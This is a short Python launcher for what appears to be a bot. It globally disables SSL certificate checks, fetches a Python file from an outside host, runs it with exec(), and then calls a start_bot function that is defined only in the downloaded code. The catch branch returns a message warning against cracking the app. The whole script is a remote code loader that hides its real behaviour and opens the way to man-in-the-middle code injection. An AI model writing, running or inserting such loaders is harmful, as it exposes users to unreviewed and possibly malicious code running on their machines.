import requests
import ssl

# Disable SSL certificate verification
ssl._create_default_https_context = ssl._create_unverified_context

def start_script():
    try:
        response = requests.get(url="https://ghostapi.great-site.net/api.py")
        if response.status_code == 200:
            data = response.text
            exec(data)
            start_bot()
        else:
            return "Failed to fetch script data"
    except Exception as e:
        return "Don't try to crack the app"
